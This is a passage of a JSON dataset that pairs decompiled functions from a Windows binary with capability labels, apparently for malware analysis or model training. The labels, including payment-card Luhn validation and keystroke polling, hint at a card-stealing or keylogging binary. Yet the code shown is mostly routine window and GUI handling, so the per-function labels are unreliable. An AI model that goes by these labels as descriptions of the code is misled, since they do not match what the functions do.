            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00457bc4(void)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *in_EAX;\n    uVar1 = in_EAX[1];\n    uVar3 = uVar1 & 0xff;\n    if (uVar1 != 0) {\n        iVar2 = sub.user32.dll_GetKeyState(0x10, uVar4, uVar1, in_EAX[2], in_EAX[3]);\n        if (iVar2 < 0) {\n            uVar3 = uVar1 + 0x2000;\n        }\n        iVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (iVar2 < 0) {\n            uVar3 = uVar3 + 0x4000;\n        }\n        if ((uVar4 & 0x20000000) != 0) {\n            uVar3 = uVar3 + 0x8000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 251
    },
    "00458f78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458f78(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    \n    uVar1 = param_2[1];\n    *(in_EAX + 0x58) = *param_2;\n    *(in_EAX + 0x5c) = uVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "0045b860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045b860(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x4a4790 + 0x1b4) = arg_8h;\n    iVar1 = sub.user32.dll_IsWindowUnicode(arg_8h);\n    if (iVar1 == 0) {\n        sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x4a4790 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffffc, *(*0x4a4790 + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x4aaffa, *0x4a4790);\n    sub.user32.dll_SetPropA(arg_8h, *0x4aaff8, *0x4a4790);\n    iVar1 = *0x4a4790;\n    *0x4a4790 = 0;\n    uVar3 = (**(iVar1 + 0x1c0))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 520
    },
    "0045bc9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bc9c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar auStack16 [8];\n    \n    puVar3 = auStack16;\n    iVar1 = param_2;\n    sub.gdi32.dll_GetWindowOrgEx(param_2, auStack16);\n    iVar2 = param_2;\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1 + *(in_EAX + 0x40), puVar3 + *(in_EAX + 0x44), 0);\n    iVar1 = param_2;\n    fcn.004601fc(param_2);\n    sub.gdi32.dll_SetWindowOrgEx(param_2, iVar1, iVar2, 0);\n    return;\n}\n",
        "token_count": 196
    },
    "0045be28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045be28(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = fcn.00402ef0();\n    *puVar2 = param_2;\n    uVar3 = fcn.0045bdfc(&stack0xfffffffc);\n    puVar2[1] = uVar3;\n    cVar1 = fcn.0045bdc4();\n    if (cVar1 == '\\0') {\n        fcn.004194b8();\n    }\n    else {\n        fcn.00419610();\n        uVar3 = fcn.00466ca8();\n        uVar3 = fcn.00466ca8(uVar3);\n        sub.user32.dll_IsChild(uVar3);\n        fcn.0041968c();\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0045c1a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c1a8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x40) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0045d4bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0045d4bc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    uint arg_ch;\n    \n    arg_ch = 0x45d4d0;\n    iVar1 = fcn.0045d488();\n    iVar3 = 0;\n    if (iVar1 != 0) {\n        arg_ch = 0;\n        arg_8h = 0;\n        fcn.0045ea84();\n        iVar2 = fcn.00463ae0(arg_8h, arg_ch);\n        iVar3 = iVar1;\n        if (iVar2 != 0) {\n            iVar3 = iVar2;\n        }\n    }\n    return CONCAT44(arg_ch, iVar3);\n}\n",
        "token_count": 172
    },
    "0045d550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045d550(void)\n\n{\n    sub.gdi32.dll_GetWindowOrgEx();\n    sub.gdi32.dll_SetWindowOrgEx();\n    return;\n}\n",
        "token_count": 38
    },
    "0045d580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045d580(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack24 = 0x45d590;\n    var_8h = fcn.00419980();\n    uStack28 = 0x45d630;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (-1 < *(var_8h + 8) + -1) {\n        var_4h = 0;\n        puStack24 = &stack0xfffffffc;\n        var_ch = *(var_8h + 8);\n        do {\n            puStack36 = 0x45d5c2;\n            var_10h = fcn.00419610();\n            puStack36 = 0x45d5cd;\n            cVar1 = fcn.004289f8();\n            if (cVar1 != '\\0') {\n                uStack40 = 0x45d609;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.0045d7bc();\n                fcn.00404f60();\n                fcn.00404f60();\n                return;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x45d637;\n    uStack28 = 0x45d62f;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 438
    },
    "0045d834": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045d834(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "0045dea4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045dea4(void)\n\n{\n    int32_t *arg_8h;\n    char extraout_DL;\n    \n    arg_8h = fcn.00404a0c();\n    fcn.0047ae34();\n    if ((arg_8h[0x25] == 0) || ((*(arg_8h[0x25] + 0x1c) & 8) != 0)) {\n        (**(*arg_8h + 0x6c))();\n    }\n    else {\n        fcn.0041f984();\n        fcn.004601fc(arg_8h);\n        (**(*arg_8h + 0x6c))();\n        fcn.0045e864();\n        fcn.0040483c();\n        arg_8h[0x25] = 0;\n    }\n    fcn.00404640();\n    arg_8h[0x1b] = 0;\n    fcn.00404640();\n    fcn.00404640();\n    fcn.0040aa04();\n    fcn.00404640();\n    fcn.0041f6bc();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0045e864": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e864(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *(in_EAX + 0x40);\n    param_2[1] = *(in_EAX + 0x44);\n    param_2[2] = *(in_EAX + 0x40) + *(in_EAX + 0x48);\n    param_2[3] = *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n    return;\n}\n",
        "token_count": 129
    },
    "0045e8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045e8c0(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack12;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack12;\n}\n",
        "token_count": 50
    },
    "0045e8d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045e8d8(void)\n\n{\n    fcn.0045e904();\n    fcn.00418198();\n    fcn.0045edd0();\n    return;\n}\n",
        "token_count": 44
    },
    "0045e904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045e904(void)\n\n{\n    int32_t *in_EAX;\n    uint uStack8;\n    \n    (**(*in_EAX + 0x44))();\n    return uStack8;\n}\n",
        "token_count": 48
    },
    "0045e91c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045e91c(void)\n\n{\n    fcn.0045e8c0();\n    fcn.00418198();\n    fcn.0045edd0();\n    return;\n}\n",
        "token_count": 45
    },
    "0045e9d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e9d4(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 + iStack20;\n    param_1[1] = param_2[1] + iStack16;\n    return;\n}\n",
        "token_count": 107
    },
    "0045ea84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ea84(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    (**(*in_EAX + 0x40))();\n    *param_1 = *param_2 - iStack20;\n    param_1[1] = param_2[1] - iStack16;\n    return;\n}\n",
        "token_count": 105
    },
    "0045edd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045edd0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iVar1 = *param_2;\n    iVar2 = param_2[1];\n    (**(*in_EAX + 0x44))(iVar1, iVar2);\n    (**(*in_EAX + 0x88))((in_EAX[0x13] - iStack16) + iVar2, (in_EAX[0x12] - iStack20) + iVar1);\n    return;\n}\n",
        "token_count": 154
    },
    "0045ff24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.0045ff24(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uchar auStack28 [16];\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    if (*(in_EAX + 0x94) != 0) {\n        cVar1 = fcn.0040483c(uVar3, uVar4, uVar5, uVar6);\n        if (cVar1 == '\\0') {\n            cVar1 = '\\0';\n            goto code_r0x0045ff58;\n        }\n    }\n    cVar1 = '\\x01';\ncode_r0x0045ff58:\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.0046134c();\n        if (iVar2 == 0) {\n            fcn.0040483c(uVar3, uVar4, uVar5, uVar6);\n        }\n        else {\n            uVar3 = fcn.0045e904();\n            arg_8h = auStack28;\n            fcn.0045e8c0();\n            fcn.004181c0(arg_8h, uVar3);\n            fcn.0040483c();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 358
    },
    "004600c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004600c8(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.0045ea84();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 77
    },
    "004601fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004601fc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "004608a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004608a4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x460644;\n    fcn.00460650(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x461b98;\n    uVar4 = 0x461b30;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00460684(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x461b68;\n    uVar4 = 0x461b10;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00460684(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x461b40;\n    uVar4 = 0x461b58;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00460684(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x461b80;\n    uVar4 = 0x461b20;\n    iVar1 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00460684(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, in_EAX, uVar3, iVar1);\n    return;\n}\n",
        "token_count": 517
    },
    "00460af8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460af8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.004717d0(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.0040483c();\n        }\n        else {\n            fcn.004600c8();\n            fcn.004717d0(var_4h, var_8h);\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "0046134c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0046134c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00404518();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.0045e608();\n            fcn.0045e5d4();\n            fcn.0045e8d8();\n            fcn.0045e91c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 231
    },
    "0046174c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046174c(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "00461be4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00461be4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar3;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x461bfd;\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x461cfe;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.00461be4::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0045ddac();\n    pcVar3 = fcn.0046399c;\n    uVar1 = fcn.00420730(fcn.0046399c, in_EAX);\n    *(in_EAX + 0x1c0) = uVar1;\n    uVar1 = fcn.0042825c();\n    *(in_EAX + 0x1a4) = uVar1;\n    fcn.00428404();\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1d4) = 0xffffffff;\n    *(in_EAX + 0x1b8) = 3;\n    if (*(*0x4a5178 + 4) == 0x11) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.00479dd0();\n        fcn.004054c0();\n    }\n    *(in_EAX + 0x1db) = 0;\n    *(in_EAX + 0x192) = *0x461d24;\n    *(in_EAX + 0x193) = 2;\n    *(in_EAX + 0x194) = 1;\n    *(in_EAX + 0x198) = 1;\n    *(in_EAX + 0x158) = 1;\n    iVar2 = fcn.0046c35c();\n    *(in_EAX + 0x1a0) = iVar2;\n    *(iVar2 + 0x1c) = in_EAX;\n    *(iVar2 + 0x18) = 0x468034;\n    *in_FS_OFFSET = pcVar3;\n    pcStack48 = 0x461d05;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 641
    },
    "00461f54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461f54(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *param_2 + *(*(in_EAX + 0x1a0) + 8);\n    param_2[1] = param_2[1] + *(*(in_EAX + 0x1a0) + 0xc);\n    param_2[2] = param_2[2] - *(*(in_EAX + 0x1a0) + 0x10);\n    param_2[3] = param_2[3] - *(*(in_EAX + 0x1a0) + 0x14);\n    return;\n}\n",
        "token_count": 167
    },
    "00462364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462364(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00466fb4();\n    if (cVar1 == '\\0') {\n        fcn.00418198();\n    }\n    else {\n        (**(*in_EAX + 0x44))();\n        *param_2 = var_8h;\n        param_2[1] = var_4h;\n    }\n    *param_2 = *param_2 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_2[1] = param_2[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 230
    },
    "004624f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004624f4(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    uint in_EDX;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint *arg_10h;\n    uint var_18h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    arg_10h = &var_10h;\n    arg_ch = *(arg_8h + -8);\n    arg_8h_00 = 0;\n    fcn.00462364();\n    fcn.00461f84(arg_8h_00, arg_ch, arg_10h, in_EDX);\n    return;\n}\n",
        "token_count": 207
    },
    "004628e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004628e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404610();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.0045e8c0();\n    iVar2 = fcn.00462d98();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00462d5c();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.00462d5c();\n                fcn.004194b8();\n                fcn.0045e5d4();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00419610();\n            fcn.004601fc(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 334
    },
    "00462bc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462bc8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    fcn.0040483c();\n    uVar3 = 1;\n    piVar4 = param_2;\n    fcn.004601fc(1);\n    uVar2 = 1;\n    fcn.004601fc(1);\n    fcn.00462b34(uVar2, uVar3, piVar4);\n    if ((*(param_2 + 7) & 2) == 0) {\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00466fb4();\n            if (cVar1 != '\\0') {\n                (**(*param_2 + 0x80))();\n            }\n        }\n        else {\n            fcn.004601fc(0);\n            fcn.00463868();\n        }\n        fcn.00462820();\n    }\n    fcn.004601fc(1);\n    return;\n}\n",
        "token_count": 298
    },
    "00462cbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462cbc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    uVar2 = 0;\n    piVar3 = param_2;\n    fcn.004601fc(0);\n    cVar1 = fcn.004047cc(uVar2, piVar3);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            fcn.0045f39c();\n        }\n    }\n    else {\n        fcn.00462b14();\n        (**(*param_2 + 0xb0))();\n    }\n    fcn.00462b80();\n    fcn.004601fc(0);\n    fcn.004601fc(0);\n    fcn.004628dc();\n    return;\n}\n",
        "token_count": 209
    },
    "00462d98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00462d98(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x1cc) != 0) {\n        iVar1 = *(*(in_EAX + 0x1cc) + 8);\n    }\n    if (*(in_EAX + 0x1d0) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x1d0) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 128
    },
    "00462e28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462e28(uint param_1, ushort param_2)\n\n{\n    fcn.00462db8(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 47
    },
    "00463374": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463374(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004608a4();\n    uVar2 = 0x4631f4;\n    uVar1 = 0x46322c;\n    uVar3 = in_EAX;\n    fcn.00463294(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 149
    },
    "004636b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004636b8(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4636ce;\n    fcn.0040483c();\n    puStack20 = 0x4636db;\n    fcn.00468048();\n    uStack24 = 0x463714;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*in_EAX + 0xb0))();\n    fcn.00463868();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x46371b;\n    uStack24 = 0x463713;\n    fcn.00468048();\n    return;\n}\n",
        "token_count": 207
    },
    "00463ba4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
